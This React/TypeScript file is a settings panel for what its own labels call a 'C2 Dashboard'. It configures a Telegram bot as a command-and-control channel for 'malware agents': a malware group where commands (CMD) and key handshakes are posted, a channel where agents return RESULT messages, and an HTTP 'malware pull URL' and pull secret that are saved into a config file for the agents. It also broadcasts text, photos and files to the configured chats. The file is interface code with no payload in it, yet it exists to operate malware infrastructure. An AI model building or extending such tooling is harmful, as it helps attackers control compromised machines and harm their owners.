'use client';

import { useState, useRef, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
  Send, Settings, MessageSquare, Loader2, Bot,
  Hash, Key, Zap, ImageIcon, FileUp, X,
  CheckCircle2, Trash2, Plus, ShieldCheck, AlertCircle,
} from 'lucide-react';
import { SectionCard } from '@/components/ui/SectionCard';
import { useToast } from '@/context/ToastContext';
import { useTelegramConfig } from '@/hooks/useApi';
import { api } from '@/lib/api';
import { cn } from '@/lib/utils';
import type { TelegramSettings } from '@/types';

/* ─── Active Bot Card ─────────────────────────────────────────────────── */
function ActiveBotCard({
  maskedToken,
  chatIds,
  c2GroupId,
  c2ChannelId,
  malwarePullBaseUrl,
  hasMalwarePullSecret,
  onDelete,
  deleting,
}: {
  maskedToken: string;
  chatIds: string[];
  c2GroupId?: string;
  c2ChannelId?: string;
  malwarePullBaseUrl?: string;
  hasMalwarePullSecret?: boolean;
  onDelete: () => void;
  deleting: boolean;
}) {
  return (
    <div className="flex items-start gap-3 rounded-xl border border-emerald-700/40 bg-emerald-950/35 p-4">
      <div className="flex h-9 w-9 flex-shrink-0 items-center justify-center rounded-xl border border-emerald-700/40 bg-emerald-950/55">
        <ShieldCheck size={16} strokeWidth={1.75} className="text-emerald-400" />
      </div>
      <div className="min-w-0 flex-1">
        <div className="mb-1 flex items-center gap-2">
          <span className="text-sm font-bold text-c2-text">Bot configured</span>
          <span className="rounded-full border border-emerald-700/45 bg-emerald-950/55 px-1.5 py-0.5 text-[10px] font-medium text-emerald-300">
            ACTIVE
          </span>
        </div>
        <p className="text-xs text-c2-muted font-mono truncate">{maskedToken}</p>
        <p className="text-xs text-c2-muted mt-1">
          {chatIds.length > 0
            ? `${chatIds.length} chat ID${chatIds.length !== 1 ? 's' : ''}: ${chatIds.join(', ')}`
            : 'No chat IDs configured'}
        </p>
        <p className="text-[11px] text-c2-muted/80 mt-1.5 font-mono break-all leading-relaxed">
          <span className="text-c2-muted">Malware HTTP pull:</span>{' '}
          {malwarePullBaseUrl ? malwarePullBaseUrl : '—'}
          {hasMalwarePullSecret ? (
            <span className="text-emerald-400"> · pull secret set</span>
          ) : (
            <span className="text-c2-muted/60"> · default secret</span>
          )}
        </p>
        <p className="text-[11px] text-c2-muted/80 mt-1 font-mono break-all leading-relaxed">
          <span className="text-c2-muted">Malware group:</span> {c2GroupId ?? '—'}{' '}
          <span className="text-c2-muted">· channel:</span> {c2ChannelId ?? '—'}
        </p>
      </div>
      <button
        type="button"
        onClick={onDelete}
        disabled={deleting}
        className="btn-toolbar-danger flex-shrink-0"
      >
        {deleting ? <Loader2 className="animate-spin" /> : <Trash2 />}
        {deleting ? 'Deleting…' : 'Delete'}
      </button>
    </div>
  );
}

/* ─── Main Component ──────────────────────────────────────────────────── */
export function TelegramSettings() {
  const toast = useToast();
  const { data: botConfig, isLoading: configLoading, mutate: refreshConfig } = useTelegramConfig();

  // Config form
  const [token, setToken] = useState('');
  const [chatIds, setChatIds] = useState('');
  const [c2GroupId, setC2GroupId] = useState('');
  const [c2ChannelId, setC2ChannelId] = useState('');
  const [c2ServerUrl, setC2ServerUrl] = useState('');
  const [malwarePullSecret, setMalwarePullSecret] = useState('');
  const [c2ServerUrlAuto, setC2ServerUrlAuto] = useState(false);
  const [savingConfig, setSavingConfig] = useState(false);
  const [deletingConfig, setDeletingConfig] = useState(false);
  const [showAddForm, setShowAddForm] = useState(false);

  // Broadcast
  const [broadcastMessage, setBroadcastMessage] = useState('');
  const [sending, setSending] = useState(false);

  // Photo
  const [selectedPhoto, setSelectedPhoto] = useState<File | null>(null);
  const [photoPreview, setPhotoPreview] = useState<string | null>(null);
  const [sendingPhoto, setSendingPhoto] = useState(false);
  const [targetChatPhoto, setTargetChatPhoto] = useState<string>('all');
  const photoInputRef = useRef<HTMLInputElement>(null);

  // File
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [sendingFile, setSendingFile] = useState(false);
  const [targetChatFile, setTargetChatFile] = useState<string>('all');
  const fileInputRef = useRef<HTMLInputElement>(null);

  // Test
  const [testMessage, setTestMessage] = useState('');
  const [testSending, setTestSending] = useState(false);

  useEffect(() => {
    if (!botConfig) return;
    setC2ServerUrl(botConfig.c2_server_url ?? '');
  }, [botConfig]);

  useEffect(() => {
    if (!showAddForm || !botConfig) return;
    setC2GroupId(botConfig.c2_group_id ?? '');
    setC2ChannelId(botConfig.c2_channel_id ?? '');
  }, [showAddForm, botConfig]);

  /* handlers ── config ── */
  const handleSaveConfig = async () => {
    const hasAny =
      token.trim() ||
      chatIds.trim() ||
      c2GroupId.trim() ||
      c2ChannelId.trim() ||
      c2ServerUrl.trim() ||
      malwarePullSecret.trim() ||
      c2ServerUrlAuto;
    if (!hasAny) {
      toast.warning('Please fill in at least one field', 'Validation');
      return;
    }
    try {
      setSavingConfig(true);
      const payload: TelegramSettings = {};
      if (token.trim()) payload.token = token.trim();
      if (chatIds.trim()) {
        payload.chat_ids = chatIds.split(',').map(id => id.trim()).filter(Boolean);
      }
      if (c2GroupId.trim()) payload.c2_group_id = c2GroupId.trim();
      if (c2ChannelId.trim()) payload.c2_channel_id = c2ChannelId.trim();
      if (c2ServerUrl.trim()) payload.c2_server_url = c2ServerUrl.trim();
      if (malwarePullSecret.trim()) payload.malware_pull_secret = malwarePullSecret.trim();
      if (c2ServerUrlAuto) payload.c2_server_url_auto = true;
      await api.updateTelegramSettings(payload);
      toast.success('Bot configuration saved successfully', 'Saved');
      setToken('');
      setChatIds('');
      setC2GroupId('');
      setC2ChannelId('');
      setMalwarePullSecret('');
      setC2ServerUrlAuto(false);
      setShowAddForm(false);
      await refreshConfig();
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'Unknown error';
      toast.error(`Failed to save config — ${msg}`, 'Save Failed');
    } finally {
      setSavingConfig(false);
    }
  };

  const handleDeleteConfig = async () => {
    try {
      setDeletingConfig(true);
      await api.deleteTelegramConfig();
      toast.success('Bot configuration removed', 'Deleted');
      await refreshConfig();
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'Unknown error';
      toast.error(`Failed to delete config — ${msg}`, 'Delete Failed');
    } finally {
      setDeletingConfig(false);
    }
  };

  /* handlers ── broadcast ── */
  const handleBroadcast = async () => {
    if (!broadcastMessage.trim()) {
      toast.warning('Please enter a message');
      return;
    }
    try {
      setSending(true);
      const res = await api.sendTelegramMessage({ message: broadcastMessage.trim() });
      const results = (res as { results?: { chat_id: string; status?: string; error?: string }[] }).results ?? [];
      const failed  = results.filter(r => r.error);
      const ok      = results.filter(r => r.status === 'sent');
      if (ok.length > 0 && failed.length === 0) {
        toast.success(`Message sent to ${ok.length} chat${ok.length !== 1 ? 's' : ''}`, 'Sent');
      } else if (ok.length > 0) {
        toast.warning(`Sent to ${ok.length}, failed for ${failed.length} — ${failed[0]?.error}`, 'Partial');
      } else {
        const errMsg = failed[0]?.error ?? 'Unknown error';
        toast.error(`Send failed — ${errMsg}`, 'Failed');
      }
      setBroadcastMessage('');
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'Unknown error';
      toast.error(`Broadcast failed — ${msg}`, 'Failed');
    } finally {
      setSending(false);
    }
  };

  /* handlers ── photo ── */
  const handlePhotoSelect = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    setSelectedPhoto(file);
    setPhotoPreview(URL.createObjectURL(file));
  };
  const handleClearPhoto = () => {
    setSelectedPhoto(null);
    if (photoPreview) URL.revokeObjectURL(photoPreview);
    setPhotoPreview(null);
    if (photoInputRef.current) photoInputRef.current.value = '';
  };
  const handleSendPhoto = async () => {
    if (!selectedPhoto) return;
    try {
      setSendingPhoto(true);
      const target  = targetChatPhoto === 'all' ? undefined : targetChatPhoto;
      const res     = await api.sendTelegramPhoto(selectedPhoto, target);
      const results = res.results ?? [];
      const failed  = results.filter(r => r.error);
      const ok      = results.filter(r => r.status === 'sent');
      if (ok.length > 0 && failed.length === 0) {
        toast.success(`Photo sent to ${ok.length} chat${ok.length !== 1 ? 's' : ''} & saved on server`, 'Sent');
      } else if (ok.length > 0) {
        toast.warning(`Sent to ${ok.length}, failed for ${failed.length} — ${failed[0]?.error}`, 'Partial');
      } else {
        toast.error(`Failed — ${failed[0]?.error ?? 'Unknown error'}`, 'Send Failed');
      }
      handleClearPhoto();
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'Unknown error';
      toast.error(`Failed to send photo — ${msg}`, 'Send Failed');
    } finally {
      setSendingPhoto(false);
    }
  };

  /* handlers ── file ── */
  const handleFileSelect = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    setSelectedFile(file);
  };
  const handleClearFile = () => {
    setSelectedFile(null);
    if (fileInputRef.current) fileInputRef.current.value = '';
  };
  const handleSendFile = async () => {
    if (!selectedFile) return;
    try {
      setSendingFile(true);
      const target  = targetChatFile === 'all' ? undefined : targetChatFile;
      const res     = await api.sendTelegramFile(selectedFile, target);
      const results = res.results ?? [];
      const failed  = results.filter(r => r.error);
      const ok      = results.filter(r => r.status === 'sent');
      if (ok.length > 0 && failed.length === 0) {
        toast.success(`File sent to ${ok.length} chat${ok.length !== 1 ? 's' : ''} & saved on server`, 'Sent');
      } else if (ok.length > 0) {
        toast.warning(`Sent to ${ok.length}, failed for ${failed.length} — ${failed[0]?.error}`, 'Partial');
      } else {
        toast.error(`Failed — ${failed[0]?.error ?? 'Unknown error'}`, 'Send Failed');
      }
      handleClearFile();
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : 'Unknown error';
      toast.error(`Failed to send file — ${msg}`, 'Send Failed');
    } finally {
      setSendingFile(false);
    }
  };

  /* handlers ── test ── */
  const handleQuickTest = async () => {
    const msg = testMessage.trim() || 'Ping — Test message from C2 Dashboard';
    try {
      setTestSending(true);
      const res = await api.sendTelegramMessage({ message: msg });
      const results = (res as { results?: { chat_id: string; status?: string; error?: string }[] }).results ?? [];
      const failed  = results.filter(r => r.error);
      const ok      = results.filter(r => r.status === 'sent');
      if (ok.length > 0) {
        toast.success(`Test delivered to ${ok.length} chat${ok.length !== 1 ? 's' : ''}`, 'Bot is working');
      } else {
        const errMsg = failed[0]?.error ?? 'Unknown error';
        toast.error(`Test failed — ${errMsg}`, 'Check bot config');
      }
      setTestMessage('');
    } catch (err: unknown) {
      const msg2 = err instanceof Error ? err.message : 'Unknown error';
      toast.error(`Test failed — ${msg2}`, 'Check bot config');
    } finally {
      setTestSending(false);
    }
  };

  return (
    <div className="space-y-8">

      {/* ── Bot Configuration ── */}
      <SectionCard
        icon={Settings}
        iconBoxClassName="border-cyan-800/35 bg-cyan-950/40"
        iconClassName="text-cyan-400"
        title="Bot Configuration"
        description="Manage your Telegram bot token and chat IDs"
        action={
          !showAddForm ? (
            <button
              type="button"
              onClick={() => setShowAddForm(true)}
              className="btn-chip-cyan"
            >
              <Plus />
              {botConfig?.has_token ? 'Update' : 'Add Bot'}
            </button>
          ) : undefined
        }
        bodyClassName="flex flex-col gap-4"
      >
        {/* Current bot card */}
        {configLoading ? (
          <div className="h-16 animate-pulse rounded-xl bg-c2-elevated" />
        ) : botConfig?.has_token ? (
          <ActiveBotCard
            maskedToken={botConfig.masked_token}
            chatIds={botConfig.chat_ids}
            c2GroupId={botConfig.c2_group_id}
            c2ChannelId={botConfig.c2_channel_id}
            malwarePullBaseUrl={botConfig.c2_server_url}
            hasMalwarePullSecret={botConfig.has_malware_pull_secret}
            onDelete={handleDeleteConfig}
            deleting={deletingConfig}
          />
        ) : !showAddForm ? (
          <div className="flex items-center gap-3 rounded-xl border border-c2-border bg-c2-elevated px-4 py-4">
            <AlertCircle size={16} className="flex-shrink-0 text-amber-400" />
            <p className="text-xs text-c2-muted">
              No bot configured. Click{' '}
              <span className="font-medium text-blue-400">Add Bot</span> to get started.
            </p>
          </div>
        ) : null}

        {/* Add / Update form */}
        <AnimatePresence>
          {showAddForm && (
            <motion.div
              initial={{ opacity: 0, height: 0 }}
              animate={{ opacity: 1, height: 'auto' }}
              exit={{ opacity: 0, height: 0 }}
              transition={{ duration: 0.2 }}
              className="overflow-hidden"
            >
              <div className="flex flex-col gap-4 border-t border-c2-border pt-1">
                {/* Token */}
                <div>
                  <label className="text-xs text-c2-muted mb-2 block font-medium uppercase tracking-wider flex items-center gap-1.5">
                    <Key size={11} /> Bot Token
                  </label>
                  <input
                    type="password"
                    value={token}
                    onChange={e => setToken(e.target.value)}
                    placeholder="123456789:ABCdefGHIjklmNOPQrstUVwxyz"
                    className="c2-input font-mono text-xs placeholder:text-c2-muted/40"
                  />
                  <p className="text-xs text-c2-muted/60 mt-1.5">Get token from @BotFather on Telegram</p>
                </div>
                {/* Chat IDs */}
                <div>
                  <label className="text-xs text-c2-muted mb-2 block font-medium uppercase tracking-wider flex items-center gap-1.5">
                    <Hash size={11} /> Chat IDs
                  </label>
                  <input
                    type="text"
                    value={chatIds}
                    onChange={e => setChatIds(e.target.value)}
                    placeholder="123456789, -987654321, ..."
                    className="c2-input font-mono text-sm placeholder:text-c2-muted/40"
                  />
                  <p className="text-xs text-c2-muted/60 mt-1.5">Comma-separated list of chat IDs</p>
                </div>
                {/* C2 malware protocol chats — must match bot.py + malware agents */}
                <div>
                  <label className="text-xs text-c2-muted mb-2 block font-medium uppercase tracking-wider flex items-center gap-1.5">
                    <MessageSquare size={11} /> Malware group ID
                  </label>
                  <input
                    type="text"
                    value={c2GroupId}
                    onChange={e => setC2GroupId(e.target.value)}
                    placeholder="-100xxxxxxxxxx"
                    className="c2-input font-mono text-sm placeholder:text-c2-muted/40"
                  />
                  <p className="text-xs text-c2-muted/60 mt-1.5">
                    Where PUBLIC_KEY / HANDSHAKE_OK / CMD are posted (same supergroup for all agents)
                  </p>
                </div>
                <div>
                  <label className="text-xs text-c2-muted mb-2 block font-medium uppercase tracking-wider flex items-center gap-1.5">
                    <Send size={11} /> Malware channel ID
                  </label>
                  <input
                    type="text"
                    value={c2ChannelId}
                    onChange={e => setC2ChannelId(e.target.value)}
                    placeholder="-100xxxxxxxxxx"
                    className="c2-input font-mono text-sm placeholder:text-c2-muted/40"
                  />
                  <p className="text-xs text-c2-muted/60 mt-1.5">
                    Channel where agents send KEY_REQUEST, HANDSHAKE, RESULT (bot must be admin)
                  </p>
                </div>
                {/* Malware HTTP pull — written into telegram_config.json for agents */}
                <div>
                  <label className="text-xs text-c2-muted mb-2 block font-medium uppercase tracking-wider flex items-center gap-1.5">
                    <Zap size={11} /> Malware pull URL (C2 HTTP)
                  </label>
                  <input
                    type="text"
                    value={c2ServerUrl}
                    onChange={e => setC2ServerUrl(e.target.value)}
                    placeholder="http://192.168.1.10:5000"
                    className="c2-input font-mono text-sm placeholder:text-c2-muted/40"
                  />
                  <p className="text-xs text-c2-muted/60 mt-1.5">
                    Agents read this from <span className="font-mono text-c2-muted">telegram_config.json</span> — same LAN as this server is typical.
                  </p>
                  <label className="mt-2 flex items-start gap-2 text-xs text-c2-muted cursor-pointer select-none">
                    <input
                      type="checkbox"
                      className="mt-0.5 rounded border-c2-border bg-c2-elevated"
                      checked={c2ServerUrlAuto}
                      onChange={e => setC2ServerUrlAuto(e.target.checked)}
                    />
                    <span>On save, detect this machine&apos;s LAN IP and set pull URL to <span className="font-mono text-c2-muted/90">http://{'<LAN>'}:5000</span></span>
                  </label>
                </div>
                <div>
                  <label className="text-xs text-c2-muted mb-2 block font-medium uppercase tracking-wider flex items-center gap-1.5">
                    <ShieldCheck size={14} strokeWidth={1.75} /> Malware pull secret (optional)
                  </label>
                  <input
                    type="password"
                    value={malwarePullSecret}
                    onChange={e => setMalwarePullSecret(e.target.value)}
                    placeholder="Leave empty to keep current / default"
                    className="c2-input font-mono text-xs placeholder:text-c2-muted/40"
                  />
                  <p className="text-xs text-c2-muted/60 mt-1.5">
                    Must match <span className="font-mono">MALWARE_PULL_SECRET</span> on the C2 server. Saved into config file for agents.
                  </p>
                </div>
                {/* Buttons */}
                <div className="flex gap-2">
                  <button
                    type="button"
                    onClick={handleSaveConfig}
                    disabled={savingConfig}
                    className="btn-primary flex flex-1 items-center justify-center gap-2"
                  >
                    {savingConfig
                      ? <><Loader2 className="animate-spin" />Saving…</>
                      : <><Settings />Save Configuration</>}
                  </button>
                  <button
                    type="button"
                    onClick={() => {
                      setShowAddForm(false);
                      setToken('');
                      setChatIds('');
                      setMalwarePullSecret('');
                      setC2ServerUrlAuto(false);
                    }}
                    className="btn-secondary shrink-0 gap-2"
                  >
                    <X /> Cancel
                  </button>
                </div>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </SectionCard>

      {/* ── Broadcast + Photo + File ── */}
      <div className="grid grid-cols-1 gap-6 lg:grid-cols-3">

        {/* Broadcast Message */}
        <SectionCard
          icon={MessageSquare}
          iconBoxClassName="border-blue-800/35 bg-blue-950/40"
          iconClassName="text-blue-400"
          title="Broadcast Message"
          description="Send text to all chat IDs"
          bodyClassName="flex flex-col gap-4"
        >
          <textarea
            value={broadcastMessage}
            onChange={e => setBroadcastMessage(e.target.value)}
            placeholder="Enter your broadcast message…"
            rows={5}
            className={cn(
              'w-full resize-none rounded-xl border border-c2-border bg-c2-elevated px-4 py-3 text-sm',
              'text-c2-text outline-none transition-all duration-200 placeholder:text-c2-muted/50',
              'focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20'
            )}
          />
          <p className="text-xs text-c2-muted/50 -mt-2">Supports Telegram Markdown formatting</p>
          <button
            type="button"
            onClick={handleBroadcast}
            disabled={sending || !broadcastMessage.trim()}
            className="btn-primary mt-auto w-full justify-center gap-2 disabled:opacity-40 sm:w-auto"
          >
            {sending ? <><Loader2 className="animate-spin" />Sending…</> : <><Send />Broadcast</>}
          </button>
        </SectionCard>

        {/* Send Photo */}
        <SectionCard
          icon={ImageIcon}
          iconBoxClassName="border-pink-800/35 bg-pink-950/30"
          iconClassName="text-pink-400"
          title="Send Photo"
          description="Send an image to a chat"
          bodyClassName="flex flex-col gap-4"
        >
          {/* Target chat selector */}
          <div>
            <label className="text-xs text-c2-muted mb-1.5 block font-medium uppercase tracking-wider">Target Chat</label>
            <select
              value={targetChatPhoto}
              onChange={e => setTargetChatPhoto(e.target.value)}
              className={cn(
                'w-full rounded-xl border border-c2-border bg-c2-elevated px-3 py-2 font-mono text-sm text-c2-text outline-none transition-all duration-200',
                'focus:border-pink-500/45 focus:ring-2 focus:ring-pink-500/15'
              )}
            >
              <option value="all">All chats</option>
              {botConfig?.chat_ids?.map(id => (
                <option key={id} value={id}>{id}</option>
              ))}
            </select>
          </div>

          <div
            onClick={() => !selectedPhoto && photoInputRef.current?.click()}
            className={cn(
              'relative rounded-xl border-2 border-dashed transition-all duration-200 overflow-hidden flex-1',
              selectedPhoto
                ? 'border-pink-500/40 cursor-default'
                : 'cursor-pointer border-c2-border hover:border-pink-500/40 hover:bg-c2-elevated/80'
            )}
          >
            {selectedPhoto && photoPreview ? (
              <div>
                {/* eslint-disable-next-line @next/next/no-img-element */}
                <img src={photoPreview} alt="preview" className="w-full max-h-36 object-contain bg-black/20" />
                <button
                  type="button"
                  onClick={(e) => {
                    e.stopPropagation();
                    handleClearPhoto();
                  }}
                  className="absolute right-2 top-2 flex h-8 w-8 items-center justify-center rounded-lg border border-white/15 bg-slate-900/75 text-white shadow-sm transition-colors hover:bg-red-600 [&_svg]:size-4"
                  aria-label="Remove photo"
                >
                  <X strokeWidth={1.75} />
                </button>
                <p className="px-3 py-1.5 text-xs text-c2-muted truncate">{selectedPhoto.name} · {(selectedPhoto.size / 1024).toFixed(1)} KB</p>
              </div>
            ) : (
              <div className="flex flex-col items-center gap-2 py-8 text-c2-muted">
                <ImageIcon size={26} className="opacity-40" />
                <p className="text-xs">Click to choose a photo</p>
                <p className="text-xs opacity-50">JPG · PNG · GIF · WEBP</p>
              </div>
            )}
          </div>
          <input ref={photoInputRef} type="file" accept="image/*" className="hidden" onChange={handlePhotoSelect} />
          <button
            type="button"
            onClick={handleSendPhoto}
            disabled={sendingPhoto || !selectedPhoto}
            className="btn-primary w-full justify-center gap-2 disabled:opacity-40 sm:w-auto"
          >
            {sendingPhoto ? <><Loader2 className="animate-spin" />Sending…</> : <><Send />Send Photo</>}
          </button>
        </SectionCard>

        {/* Send File */}
        <SectionCard
          icon={FileUp}
          iconBoxClassName="border-emerald-800/35 bg-emerald-950/35"
          iconClassName="text-emerald-400"
          title="Send File"
          description="Send a document to a chat"
          bodyClassName="flex flex-col gap-4"
        >
          {/* Target chat selector */}
          <div>
            <label className="text-xs text-c2-muted mb-1.5 block font-medium uppercase tracking-wider">Target Chat</label>
            <select
              value={targetChatFile}
              onChange={e => setTargetChatFile(e.target.value)}
              className={cn(
                'w-full rounded-xl border border-c2-border bg-c2-elevated px-3 py-2 font-mono text-sm text-c2-text outline-none transition-all duration-200',
                'focus:border-emerald-500/45 focus:ring-2 focus:ring-emerald-500/15'
              )}
            >
              <option value="all">All chats</option>
              {botConfig?.chat_ids?.map(id => (
                <option key={id} value={id}>{id}</option>
              ))}
            </select>
          </div>
          <div
            onClick={() => !selectedFile && fileInputRef.current?.click()}
            className={cn(
              'rounded-xl border-2 border-dashed transition-all duration-200 flex-1',
              selectedFile
                ? 'border-emerald-500/40 cursor-default'
                : 'cursor-pointer border-c2-border hover:border-emerald-500/40 hover:bg-c2-elevated/80'
            )}
          >
            {selectedFile ? (
              <div className="flex items-center gap-3 px-4 py-4">
                <div className="w-9 h-9 rounded-lg bg-emerald-500/20 flex items-center justify-center flex-shrink-0">
                  <CheckCircle2 size={16} className="text-emerald-400" />
                </div>
                <div className="flex-1 min-w-0">
                  <p className="truncate text-sm font-medium text-c2-text">{selectedFile.name}</p>
                  <p className="text-xs text-c2-muted">{(selectedFile.size / 1024).toFixed(1)} KB</p>
                </div>
                <button
                  onClick={e => { e.stopPropagation(); handleClearFile(); }}
                  type="button"
                  className="flex h-7 w-7 flex-shrink-0 items-center justify-center rounded-full border border-c2-border bg-c2-elevated transition-colors hover:border-red-500/40 hover:bg-red-950/40"
                >
                  <X size={12} className="text-c2-muted" />
                </button>
              </div>
            ) : (
              <div className="flex flex-col items-center gap-2 py-8 text-c2-muted">
                <FileUp size={26} className="opacity-40" />
                <p className="text-xs">Click to choose a file</p>
                <p className="text-xs opacity-50">Any type · up to 50 MB</p>
              </div>
            )}
          </div>
          <input ref={fileInputRef} type="file" className="hidden" onChange={handleFileSelect} />
          <button
            type="button"
            onClick={handleSendFile}
            disabled={sendingFile || !selectedFile}
            className="btn-primary w-full justify-center gap-2 disabled:opacity-40 sm:w-auto"
          >
            {sendingFile ? <><Loader2 className="animate-spin" />Sending…</> : <><Send />Send File</>}
          </button>
        </SectionCard>
      </div>

      {/* ── Quick Test ── */}
      <SectionCard
        icon={Zap}
        iconBoxClassName="border-amber-800/35 bg-amber-950/35"
        iconClassName="text-amber-400"
        title="Quick Test"
        description="Ping all chats"
        bodyClassName="flex flex-col gap-4 sm:flex-row sm:items-center"
      >
        <div className="flex-1 flex items-center gap-3 w-full">
          <div className="relative flex-1">
            <Bot size={14} className="absolute left-3 top-1/2 -translate-y-1/2 text-c2-muted" />
            <input
              type="text"
              value={testMessage}
              onChange={e => setTestMessage(e.target.value)}
              placeholder="Test message (optional)"
              onKeyDown={e => { if (e.key === 'Enter') handleQuickTest(); }}
              className={cn(
                'w-full rounded-xl border border-c2-border bg-c2-elevated py-2.5 pl-9 pr-4 text-sm',
                'text-c2-text outline-none transition-all duration-200 placeholder:text-c2-muted/50',
                'focus:border-amber-500/45 focus:ring-2 focus:ring-amber-500/15'
              )}
            />
          </div>
          <button
            type="button"
            onClick={handleQuickTest}
            disabled={testSending}
            className="btn-chip-amber flex-shrink-0"
          >
            {testSending
              ? <><Loader2 className="animate-spin" />Sending…</>
              : <><Zap />Send Test</>}
          </button>
        </div>
      </SectionCard>
    </div>
  );
}

export default TelegramSettings;
